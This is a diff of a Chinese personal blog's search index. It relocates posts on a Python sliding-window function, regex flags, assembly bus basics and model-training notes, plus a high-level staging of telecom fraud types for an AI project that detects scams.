+        <tag>汇编硬件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>滑动窗口数据清洗分区</title>
+    <url>/2025/03/18/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%88%86%E5%8C%BA/</url>
+    <content><![CDATA[<h1 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h1><ul>
+<li><p>三个基本元素:</p>
+</li>
+<li><ul>
+<li>可迭代数据</li>
+<li>单个动态窗口<code>window</code>大小</li>
+<li>步长<code>step_size</code></li>
+</ul>
+</li>
+<li><p>如下代码:</p>
+</li>
+<li><pre><code class="language-python">def sliding_windows(data, window_size, step_size):#data要是可迭代数据
+    &quot;&quot;&quot;
+    步长是对窗口的移动距离
+    窗口大小是窗口的长度
+    细看以下的说明
+    &quot;&quot;&quot;
+    windows = [] #定义窗口集
+    start = 0 #动态窗口的初始值
+    while start + window_size &lt;= len(data):#窗口大小不能直接超过迭代数据大小
+        window = data[start:start+window_size]#对窗口长度进行定义
+        windows.append(window)#将窗口加入到列表中
+        start += step_size#窗口的起始位置动态变化,即动态改变窗口位置
+    return windows
+
+if __name__ == &#39;__main__&#39;:
+    data = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    print(sliding_windows(data, 5, 2))
+</code></pre>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>ai</category>
+      </categories>
+      <tags>
+        <tag>数据处理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>爬虫，寻找数据集入门</title>
+    <url>/2025/03/10/%E7%88%AC%E8%99%AB%EF%BC%8C%E5%AF%BB%E6%89%BE%E6%95%B0%E6%8D%AE%E9%9B%86%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>犯罪脚本数据源梳理</title>
+    <url>/2025/03/14/%E7%8A%AF%E7%BD%AA%E8%84%9A%E6%9C%AC%E6%95%B0%E6%8D%AE%E6%BA%90%E6%A2%B3%E7%90%86/</url>
+    <content><![CDATA[<h1 id="脚本内容归纳"><a href="#脚本内容归纳" class="headerlink" title="脚本内容归纳"></a>脚本内容归纳</h1><table>
+<thead>
+<tr>
+<th>案件类型</th>
+<th align="left">准备阶段</th>
+<th align="left">事前阶段</th>
+<th align="left">实施阶段</th>
+<th align="left">事后阶段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>“杀猪盘”</td>
+<td align="left">1.对于工具环境的准备<br />2.人手分配<br />3.被害人信息收集<br /></td>
+<td align="left">1.对于目标的找寻<br />2.开始培养情感<br /></td>
+<td align="left">1.投入小额资金获取初步信任<br />2.或者登入未知app<br /></td>
+<td align="left">1.切断联系方式<br />2.转移财务<br /></td>
+</tr>
+<tr>
+<td>“刷单”</td>
+<td align="left">1.准备相关工具<br />2.软件硬件制作虚假信息&#x2F;二维码<br /></td>
+<td align="left">1.对目标的寻找:<br />2.散布虚假信息，虚假链接<br /></td>
+<td align="left">1.诈骗人分为1与2分任务进行合作。<br />2.2负责寻找受害人，1对其进行诈骗操作<br /></td>
+<td align="left">1.洗钱<br />2.分赃<br /></td>
+</tr>
+<tr>
+<td>“跨境诈骗”</td>
+<td align="left">1.硬件工具的准备<br />2.人员准备<br />3.场所准备<br /></td>
+<td align="left">1.寻找身份信息<br />2.建立管理模式<br />3.维护系统<br /></td>
+<td align="left">1.冒充身份，给予被害人假消息，引起恐慌<br />2.获取信任<br />3.隔离被害人(通讯方式)<br />4.诱导完成转账诈骗<br /></td>
+<td align="left">1.复盘诈骗经验，建立奖惩机制，提升诈骗效率<br />2.人员回流<br /></td>
+</tr>
+<tr>
+<td>“传销”</td>
+<td align="left">1.组建网站发布消息<br />2.发展人员<br />3.组件资金体系<br /></td>
+<td align="left">1.寻找目标。<br /></td>
+<td align="left">1.同上</td>
+<td align="left">1.同上</td>
+</tr>
+<tr>
+<td></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<ul>
+<li>电诈流程梳理:<ul>
+<li>其实准备阶段、事前阶段、实施阶段、事后阶段都是大同小异</li>
+<li>准备阶段就是一个从无到有的情况。包括设备、人员、场所。</li>
+<li>事前就是对目标的找寻(具有多种方式)，以及熟悉，建立感情。</li>
+<li>实施阶段就是对受害者进行诈骗，开始督促受害人转移资金。</li>
+<li>事后阶段，对资金进行转移分赃并对诈骗流程进行复盘。</li>
+</ul>
+</li>
+<li>个人理解：<ul>
+<li>不同案件就是各个阶段的方式不同罢了</li>
+</ul>
+</li>
+<li>难点：<ul>
+<li>如何让ai自动识别并且提取出中间的关键词，且知晓这些关键词处于哪个阶段，哪种案子，<strong>提取、识别、构建</strong>是我项目的一大难点。</li>
+<li>其中：切割文本，我们可以使用什么技术呢？识别，切割后的文本，如何让XGBoost和BERT预训练混合模型进行识别，或者说，我们的训练数据集何在。如何构建我们的图标，将分类好的数据分别进行总结，然后写入图表中。这里算是第二阶段，将脚本模板构建</li>
+<li>第三阶段可以使用第二阶段遗留下来的脚本，比如<strong>提取、识别、构建</strong>系统，该阶段就是对网上的数据通过系统的处理放入RAG库中进行储存。RAG库除了检索增强就是对模板进行实时更新，另外使用我的双模型系统还可以把脚本阶段和对应的扰乱措施对应。</li>
+</ul>
+</li>
+</ul>
+<h1 id="数据源梳理"><a href="#数据源梳理" class="headerlink" title="数据源梳理"></a>数据源梳理</h1><h2 id="来源："><a href="#来源：" class="headerlink" title="来源："></a>来源：</h2><ul>
+<li><strong>中国裁判文书网</strong></li>
+</ul>
+]]></content>
+      <categories>
+        <category>ai</category>
+      </categories>
+      <tags>
+        <tag>ai数据流梳理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>特征工程一致性与持久化</title>
+    <url>/2025/03/08/%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B%E4%B8%80%E8%87%B4%E6%80%A7%E4%B8%8E%E6%8C%81%E4%B9%85%E5%8C%96/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>训练</title>
+    <url>/2025/01/22/%E8%AE%AD%E7%BB%83/</url>
+    <content><![CDATA[<h3 id="训练ai"><a href="#训练ai" class="headerlink" title="训练ai"></a>训练ai</h3><h4 id="下载资源"><a href="#下载资源" class="headerlink" title="下载资源"></a>下载资源</h4><p>1.u need to use the google colab<br>2.unsloth notebook:<a href="https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp">https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp</a></p>
+<h4 id="dataset"><a href="#dataset" class="headerlink" title="dataset"></a>dataset</h4><img src="/2025/01/22/%E8%AE%AD%E7%BB%83/image-20250122153200433.png" class="" title="image-20250122153200433">
+
+<h4 id="unsloth"><a href="#unsloth" class="headerlink" title="unsloth"></a>unsloth</h4><h4 id="weight"><a href="#weight" class="headerlink" title="weight"></a>weight</h4><h4 id="dataset-processing"><a href="#dataset-processing" class="headerlink" title="dataset processing"></a>dataset processing</h4><h4 id="huggface"><a href="#huggface" class="headerlink" title="huggface"></a>huggface</h4>]]></content>
+      <categories>
+        <category>ai</category>
+      </categories>
+      <tags>
+        <tag>ai训练</tag>
       </tags>
   </entry>
   <entry>
@@ -2777,199 +3169,6 @@ class ContextAwareClassifier:
       </categories>
       <tags>
         <tag>朴素贝叶斯分类</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>正则匹配注意点个人笔记</title>
-    <url>/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h3 id="正则匹配个人易忽略点记录"><a href="#正则匹配个人易忽略点记录" class="headerlink" title="正则匹配个人易忽略点记录"></a>正则匹配个人易忽略点记录</h3><h4 id="标志-模式修正符"><a href="#标志-模式修正符" class="headerlink" title="标志&#x2F;模式修正符"></a>标志&#x2F;模式修正符</h4><h5 id="1-多行修饰符-Multline"><a href="#1-多行修饰符-Multline" class="headerlink" title="1.多行修饰符(Multline)"></a>1.多行修饰符(Multline)</h5><p>与($,^)这两个检查首尾的符号紧密相关,注意点:在默认情况下,它们是默认检查全局，即所有字符的开头和结尾,即使你使用了换行符号,它也不会对首位进行检查。<br>例如表达式: &#x2F;.at(.)?$&#x2F;gm 表示小写字符a后跟小写字符t,末尾可选除换行符外任意字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/&quot; =&gt; The fat</span><br><span class="line">                cat sat</span><br><span class="line">                on the mat.</span><br></pre></td></tr></table></figure>
-<p>这里只匹配mat<br>但是:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/gm&quot; =&gt; The fat</span><br><span class="line">                  cat sat</span><br><span class="line">                  on the mat.</span><br></pre></td></tr></table></figure>
-<p>这里就会把fat,sat,mat都给匹配上</p>
-<p><strong>总结:</strong></p>
-<p>重点就是:m加上后会在每排匹配,没有m只会在全局看尾巴或者开头有没有目标字符。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>正则匹配</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>汇编硬件基础</title>
-    <url>/2025/03/17/%E6%B1%87%E7%BC%96%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<h1 id="三线概念"><a href="#三线概念" class="headerlink" title="三线概念"></a>三线概念</h1><h2 id="名词辨析"><a href="#名词辨析" class="headerlink" title="名词辨析"></a>名词辨析</h2><ul>
-<li><strong>地址</strong>总线的宽度:</li>
-<li><ul>
-<li><strong>原理</strong>：地址总线宽度决定 CPU 的寻址能力，寻址能力的计算公式为 (2^n) （n 为地址总线宽度），单位是字节（Byte）。8bit &#x3D; 1Byte。</li>
-</ul>
-</li>
-<li>储存单元:</li>
-<li><ul>
-<li>**原理：**单位为Byte,存储单元从0开始，n-1结束</li>
-<li><img src="/2025/03/17/%E6%B1%87%E7%BC%96%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80/image-20250317185253083.png" class="" title="image-20250317185253083"></li>
-</ul>
-</li>
-<li><strong>数据</strong>总线宽度:</li>
-<li><ul>
-<li>原理:数据总线宽度决定了 CPU 一次能传送的数据位数，单位是位（bit），而 8 bit (&#x3D; 1) Byte ，直接根据数据总线宽度换算成字节（B）。</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>汇编语言</category>
-      </categories>
-      <tags>
-        <tag>汇编硬件</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>爬虫，寻找数据集入门</title>
-    <url>/2025/03/10/%E7%88%AC%E8%99%AB%EF%BC%8C%E5%AF%BB%E6%89%BE%E6%95%B0%E6%8D%AE%E9%9B%86%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>滑动窗口数据清洗分区</title>
-    <url>/2025/03/18/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%88%86%E5%8C%BA/</url>
-    <content><![CDATA[<h1 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h1><ul>
-<li><p>三个基本元素:</p>
-</li>
-<li><ul>
-<li>可迭代数据</li>
-<li>单个动态窗口<code>window</code>大小</li>
-<li>步长<code>step_size</code></li>
-</ul>
-</li>
-<li><p>如下代码:</p>
-</li>
-<li><pre><code class="language-python">def sliding_windows(data, window_size, step_size):#data要是可迭代数据
-    &quot;&quot;&quot;
-    步长是对窗口的移动距离
-    窗口大小是窗口的长度
-    细看以下的说明
-    &quot;&quot;&quot;
-    windows = [] #定义窗口集
-    start = 0 #动态窗口的初始值
-    while start + window_size &lt;= len(data):#窗口大小不能直接超过迭代数据大小
-        window = data[start:start+window_size]#对窗口长度进行定义
-        windows.append(window)#将窗口加入到列表中
-        start += step_size#窗口的起始位置动态变化,即动态改变窗口位置
-    return windows
-
-if __name__ == &#39;__main__&#39;:
-    data = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
-    print(sliding_windows(data, 5, 2))
-</code></pre>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>ai</category>
-      </categories>
-      <tags>
-        <tag>数据处理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>特征工程一致性与持久化</title>
-    <url>/2025/03/08/%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B%E4%B8%80%E8%87%B4%E6%80%A7%E4%B8%8E%E6%8C%81%E4%B9%85%E5%8C%96/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>犯罪脚本数据源梳理</title>
-    <url>/2025/03/14/%E7%8A%AF%E7%BD%AA%E8%84%9A%E6%9C%AC%E6%95%B0%E6%8D%AE%E6%BA%90%E6%A2%B3%E7%90%86/</url>
-    <content><![CDATA[<h1 id="脚本内容归纳"><a href="#脚本内容归纳" class="headerlink" title="脚本内容归纳"></a>脚本内容归纳</h1><table>
-<thead>
-<tr>
-<th>案件类型</th>
-<th align="left">准备阶段</th>
-<th align="left">事前阶段</th>
-<th align="left">实施阶段</th>
-<th align="left">事后阶段</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>“杀猪盘”</td>
-<td align="left">1.对于工具环境的准备<br />2.人手分配<br />3.被害人信息收集<br /></td>
-<td align="left">1.对于目标的找寻<br />2.开始培养情感<br /></td>
-<td align="left">1.投入小额资金获取初步信任<br />2.或者登入未知app<br /></td>
-<td align="left">1.切断联系方式<br />2.转移财务<br /></td>
-</tr>
-<tr>
-<td>“刷单”</td>
-<td align="left">1.准备相关工具<br />2.软件硬件制作虚假信息&#x2F;二维码<br /></td>
-<td align="left">1.对目标的寻找:<br />2.散布虚假信息，虚假链接<br /></td>
-<td align="left">1.诈骗人分为1与2分任务进行合作。<br />2.2负责寻找受害人，1对其进行诈骗操作<br /></td>
-<td align="left">1.洗钱<br />2.分赃<br /></td>
-</tr>
-<tr>
-<td>“跨境诈骗”</td>
-<td align="left">1.硬件工具的准备<br />2.人员准备<br />3.场所准备<br /></td>
-<td align="left">1.寻找身份信息<br />2.建立管理模式<br />3.维护系统<br /></td>
-<td align="left">1.冒充身份，给予被害人假消息，引起恐慌<br />2.获取信任<br />3.隔离被害人(通讯方式)<br />4.诱导完成转账诈骗<br /></td>
-<td align="left">1.复盘诈骗经验，建立奖惩机制，提升诈骗效率<br />2.人员回流<br /></td>
-</tr>
-<tr>
-<td>“传销”</td>
-<td align="left">1.组建网站发布消息<br />2.发展人员<br />3.组件资金体系<br /></td>
-<td align="left">1.寻找目标。<br /></td>
-<td align="left">1.同上</td>
-<td align="left">1.同上</td>
-</tr>
-<tr>
-<td></td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-</tr>
-<tr>
-<td></td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-</tr>
-<tr>
-<td></td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-<ul>
-<li>电诈流程梳理:<ul>
-<li>其实准备阶段、事前阶段、实施阶段、事后阶段都是大同小异</li>
-<li>准备阶段就是一个从无到有的情况。包括设备、人员、场所。</li>
-<li>事前就是对目标的找寻(具有多种方式)，以及熟悉，建立感情。</li>
-<li>实施阶段就是对受害者进行诈骗，开始督促受害人转移资金。</li>
-<li>事后阶段，对资金进行转移分赃并对诈骗流程进行复盘。</li>
-</ul>
-</li>
-<li>个人理解：<ul>
-<li>不同案件就是各个阶段的方式不同罢了</li>
-</ul>
-</li>
-<li>难点：<ul>
-<li>如何让ai自动识别并且提取出中间的关键词，且知晓这些关键词处于哪个阶段，哪种案子，<strong>提取、识别、构建</strong>是我项目的一大难点。</li>
-<li>其中：切割文本，我们可以使用什么技术呢？识别，切割后的文本，如何让XGBoost和BERT预训练混合模型进行识别，或者说，我们的训练数据集何在。如何构建我们的图标，将分类好的数据分别进行总结，然后写入图表中。这里算是第二阶段，将脚本模板构建</li>
-<li>第三阶段可以使用第二阶段遗留下来的脚本，比如<strong>提取、识别、构建</strong>系统，该阶段就是对网上的数据通过系统的处理放入RAG库中进行储存。RAG库除了检索增强就是对模板进行实时更新，另外使用我的双模型系统还可以把脚本阶段和对应的扰乱措施对应。</li>
-</ul>
-</li>
-</ul>
-<h1 id="数据源梳理"><a href="#数据源梳理" class="headerlink" title="数据源梳理"></a>数据源梳理</h1><h2 id="来源："><a href="#来源：" class="headerlink" title="来源："></a>来源：</h2><ul>
-<li><strong>中国裁判文书网</strong></li>
-</ul>
-]]></content>
-      <categories>
-        <category>ai</category>
-      </categories>
-      <tags>
-        <tag>ai数据流梳理</tag>
       </tags>
   </entry>
   <entry>
@@ -3240,20 +3439,6 @@ if __name__ == &#39;__main__&#39;:
       </categories>
       <tags>
         <tag>transformer模型入门</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>训练</title>
-    <url>/2025/01/22/%E8%AE%AD%E7%BB%83/</url>
-    <content><![CDATA[<h3 id="训练ai"><a href="#训练ai" class="headerlink" title="训练ai"></a>训练ai</h3><h4 id="下载资源"><a href="#下载资源" class="headerlink" title="下载资源"></a>下载资源</h4><p>1.u need to use the google colab<br>2.unsloth notebook:<a href="https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp">https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp</a></p>
-<h4 id="dataset"><a href="#dataset" class="headerlink" title="dataset"></a>dataset</h4><img src="/2025/01/22/%E8%AE%AD%E7%BB%83/image-20250122153200433.png" class="" title="image-20250122153200433">
-
-<h4 id="unsloth"><a href="#unsloth" class="headerlink" title="unsloth"></a>unsloth</h4><h4 id="weight"><a href="#weight" class="headerlink" title="weight"></a>weight</h4><h4 id="dataset-processing"><a href="#dataset-processing" class="headerlink" title="dataset processing"></a>dataset processing</h4><h4 id="huggface"><a href="#huggface" class="headerlink" title="huggface"></a>huggface</h4>]]></content>
-      <categories>
-        <category>ai</category>
-      </categories>
-      <tags>
-        <tag>ai训练</tag>
       </tags>
   </entry>
 </search>
